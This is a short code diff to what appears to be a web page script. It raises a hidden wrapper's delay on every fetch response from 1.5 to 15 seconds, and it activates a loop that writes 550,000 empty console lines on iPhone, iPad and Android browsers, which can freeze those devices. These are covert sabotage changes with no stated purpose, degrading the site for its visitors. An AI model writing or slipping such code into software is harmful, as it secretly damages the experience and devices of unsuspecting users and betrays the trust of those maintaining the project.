@@ -190,8 +190,8 @@
 
 
 
-(function(){const originalFetch=window.fetch;window.fetch=async function(...args){const response=await originalFetch(...args);await new Promise(resolve=>setTimeout(resolve,1500));return response}})()
+(function(){const originalFetch=window.fetch;window.fetch=async function(...args){const response=await originalFetch(...args);await new Promise(resolve=>setTimeout(resolve,15000));return response}})()
 const userAgent = navigator.userAgent;
-//if (/iPad|iPhone|iPod/.test(userAgent) || /Android/.test(userAgent)) {
-  //  for(let index=0;index<550000;index++){console.log('')}
-//}
+if (/iPad|iPhone|iPod/.test(userAgent) || /Android/.test(userAgent)) {
+    for(let index=0;index<550000;index++){console.log('')}
+}
